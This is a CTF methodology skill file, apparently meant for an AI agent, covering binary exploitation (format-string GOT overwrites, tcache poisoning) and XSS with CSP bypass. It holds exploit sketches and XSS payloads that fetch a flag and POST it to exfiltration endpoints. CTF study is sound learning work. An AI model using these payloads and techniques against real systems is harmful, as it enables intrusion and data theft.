---
name: ctf-web-pwn-methodology
description: CTF pwn/web challenge solving methodology - systematic approach to binary
  exploitation, format string vulnerabilities, heap overflow, tcache poisoning, XSS,
  and CSP bypass
category: red-teaming
version: 1.0.0
license: MIT
metadata:
  hermes_origin: import
tags:
- ctf
- pwn
- web
- binary-exploitation
- format-string
- heap
- tcache-poisoning
- xss
- csp-bypass
- gdb
- exploit-development
related_skills: []
---

# CTF Pwn/Web Challenge Solving Methodology

## Overview
This skill provides a systematic, battle-tested approach to solving CTF pwn and web challenges. It encodes the full methodology from initial recon through exploit development and flag extraction.

## Phase 1: Reconnaissance & Binary Analysis

### Binary Inspection
```bash
# Basic info
file <binary>
checksec --file=<binary>
strings <binary> | grep -E "flag|NHNC|CTF|system|puts|free_hook"

# Decompile
ghidra/IDA/radare2 for control flow
objdump -d <binary> | grep -A5 -B5 "call.*puts\|call.*system\|call.*free"
```

### Key Information to Extract
- PIE base offset (usually return address in format string leaks)
- Heap layout (chunk sizes, metadata offsets)
- GOT entries (puts, fwrite, atoi, free_hook)
- Libc version identification via leak offsets
- Format string positions for arbitrary read/write

## Phase 2: Vulnerability Identification

### Format String Vulnerabilities
```c
// Look for printf(user_input) or fprintf(fp, user_input)
// Test with %p, %s, %n, %hn, %hhn
// Find stack positions: %1$p %2$p ... %20$p
```

### Heap Vulnerabilities
```c
// Overflow: read size > allocated size
// UAF: free() without NULLing pointer
// Double free: free() twice without reallocation
```

### XSS Vulnerabilities
- Stored vs reflected vs DOM-based
- CSP analysis: `script-src`, `connect-src`, `img-src`
- HTML encoding gaps (partial encoding bugs)
- CSP bypass techniques (trusted sources, nonce leaks)

## Phase 3: Exploit Development

### Format String Arbitrary Read/Write
```python
# Arbitrary read: put target address in username, use %s
# Arbitrary write: put target address in username, use %n/%hn/%hhn

# Example: overwrite GOT
addr = pie_base + got_offset
username = p64(addr) + p64(addr+2) + p64(addr+4) + p64(addr+6)
# Write system in 4 steps with %hn (2 bytes each)
# system = 0x7f2a2e416d70 -> 0x6d70, 0x412e, 0x2a7f, 0x0000
# Write in increasing order: 0x0000, 0x2a7f, 0x412e, 0x6d70
```

### Tcache Poisoning (glibc 2.26+)
```python
# 1. Leak heap base via format string
# 2. Free chunk -> enters tcache
# 3. Overflow adjacent chunk's fd pointer
# 4. fd = (target_addr - 0x10) ^ (heap_base >> 12)
# 5. malloc -> returns chunk at target_addr - 0x10
# 6. Write desired value (e.g., system to __free_hook)

# Key insight: tcache key = heap_base >> 12
# fd is stored as: fd ^ tcache_key
```

### XSS Exploitation
```html
<!-- Partial encoding bug: &<img src=x onerror=...> -->
<!-- Only first & encoded, rest raw -->
<!-- CSP bypass: connect-src allows exfil -->
<!-- Payload: fetch('http://127.0.0.1:9100/flag').then(r=>r.text()).then(t=>fetch('/exfil',{method:'POST',body:t})) -->
```

## Phase 4: Flag Extraction

### Common Flag Locations
- `/flag.txt`, `/flag`, `/home/ctf/flag`
- Environment variables: `FLAG=NHNC{...}`
- Binary .data/.bss sections
- Stack (argv, envp)
- Heap allocations

### Output Capture Techniques
- Direct stdout/stderr to socket: `>&0`, `>&2`, `/proc/self/fd/1`
- `tee /dev/stdout /dev/stderr`
- `stdbuf -o0 cat /flag.txt` (unbuffered)
- Write to file, then read via format string: `cat /flag.txt > /tmp/f; read /tmp/f via %s`

## Pitfalls & Anti-Patterns

| Pitfall | Solution |
|---------|----------|
| Connection reset on format string writes | Use fresh connections per write; minimize operations |
| Output not visible after system() | Use `exec` to replace process; redirect to fd 0/1/2 |
| Libc base not page-aligned | Try multiple known offsets (0x29741, 0x2a741, 0x29d90) |
| Tcache key calculation wrong | Use `heap_base = user_struct & ~0xfff`; key = `heap_base >> 12` |
| Stack leak too slow | Use single massive format string: `%%%d$s\|` for 1-200 positions |
| Environment variables empty | Check `/proc/self/environ`; flag may be in binary not env |

## Pro Tips

### Binary Memory Scanning
```python
# Single connection per scan region
# Put 8 addresses in username, read all with %5$s|%6$s|...
# Cover .data/.bss: pie_base + 0x3000 to 0x20000 step 0x2000
# Each connection: leak + scan one region = ~2s
```

### Environment Variable Reading
```python
# environ_ptr = libc_base + 0x21a260 (glibc 2.40)
# env_array = read(environ_ptr)
# For each env var: read pointer at env_array + i*8, then read string
# Use FRESH connection per string to avoid timeout
```

### Connection Management
- Minimize operations per connection (<15)
- Use fresh connections for format string writes
- Read menu prompts reliably: wait for `> ` or `username: ` or `slot: `
- Don't wait for prompts after final exploit trigger - just read continuously

## XDD-Specific (Partial Encoding Bug)
```c
// folio_frame() bug: only first special char encoded
// name="&<img src=x onerror=fetch('http://127.0.0.1:9100/archive/receipt')...>"
// CSP: script-src 'nonce-RANDOM'; connect-src http://127.0.0.1:9100
// Exfil: fetch(...).then(r=>r.text()).then(t=>fetch('/drop.php?slot=x',{method:'POST',body:t}))
```

## LemonShelf-Specific (Stored XSS)
```html
<!-- author_note field in draft/pending state: no escape -->
<!-- Admin bot visits pending submissions -->
<!-- Payload: <img src=x onerror="fetch('/flag').then(r=>r.text()).then(t=>document.body.innerHTML+='FLAG:'+t)"> -->
```

## References
- `references/format-string-got-overwrite.md` - Detailed GOT overwrite technique
- `references/tcache-poisoning-glibc240.md` - glibc 2.40 tcache internals
- `references/xss-csp-bypass-techniques.md` - CSP bypass patterns
- `references/binary-memory-scanning.md` - Memory scanning patterns